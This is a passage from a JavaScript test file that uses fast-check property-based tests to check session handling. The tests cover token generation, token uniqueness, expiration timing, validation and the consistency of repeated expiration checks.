              expect(isExpiredAtTime(expiresAt, expiredTime)).toBe(true);
            }

            // Expiration check should be consistent
            const isExpired1 = isSessionExpired(expiresAt);
            const isExpired2 = isSessionExpired(expiresAt);
            expect(isExpired1).toBe(isExpired2);
          }
        ),
        { numRuns: 50 }
      );
    });

    it('should maintain session lifecycle invariants', () => {
      fc.assert(
        fc.property(
          fc.array(
            fc.record({
              userId: fc.string({ minLength: 1, maxLength: 10 }),
              timeout: fc.integer({ min: 60000, max: 3600000 }),
            }),
            { minLength: 1, maxLength: 5 }
          ),
          (sessionConfigs) => {
            const sessions = sessionConfigs.map(config => {
              const token = generateSessionToken();
              const expiresAt = createSessionExpiration(config.timeout);
              const createdAt = new Date();

              return {
                token,
                userId: config.userId,
                expiresAt,
                createdAt,
              };
            });

            sessions.forEach(session => {
              // Invariant 1: All sessions should be valid when created
              expect(validateSession(session)).toBe(true);
              
              // Invariant 2: Expiration time should be in the future
              expect(session.expiresAt.getTime()).toBeGreaterThan(session.createdAt.getTime());
              
              // Invariant 3: Session should not be expired immediately
              expect(isSessionExpired(session.expiresAt)).toBe(false);
              
              // Invariant 4: Token should be unique and non-empty
              expect(session.token).toBeTruthy();
              expect(typeof session.token).toBe('string');
              expect(session.token.length).toBeGreaterThan(0);
              
              // Invariant 5: UserId should be non-empty
              expect(session.userId).toBeTruthy();
              expect(typeof session.userId).toBe('string');
              expect(session.userId.length).toBeGreaterThan(0);
            });

            // Invariant 6: All tokens should be unique
            const tokens = sessions.map(s => s.token);
            const uniqueTokens = new Set(tokens);
            expect(uniqueTokens.size).toBe(tokens.length);
          }
        ),
        { numRuns: 50 }
      );
    });

    it('should handle concurrent session expiration checks', () => {
      fc.assert(
        fc.property(
          fc.record({
            userId: fc.string({ minLength: 1, maxLength: 10 }),
            timeout: fc.integer({ min: 60000, max: 3600000 }),
            checkCount: fc.integer({ min: 2, max: 10 }),
          }),
          (testData) => {
            const token = generateSessionToken();
            const expiresAt = createSessionExpiration(testData.timeout);
            const createdAt = new Date();

            const session = {
              token,
              userId: testData.userId,
              expiresAt,
              createdAt,
            };

            // Perform multiple concurrent expiration checks
            const results = Array.from({ length: testData.checkCount }, () => 
              isSessionExpired(session.expiresAt)
            );

            // All results should be identical (deterministic)
            const firstResult = results[0];
            results.forEach(result => {
              expect(result).toBe(firstResult);
            });

            // All validation results should be identical
            const validationResults = Array.from({ length: testData.checkCount }, () => 
              validateSession(session)
            );

            validationResults.forEach(result => {
              expect(result).toBe(true);
            });
          }
        ),
        { numRuns: 50 }
      );
    });
  });
});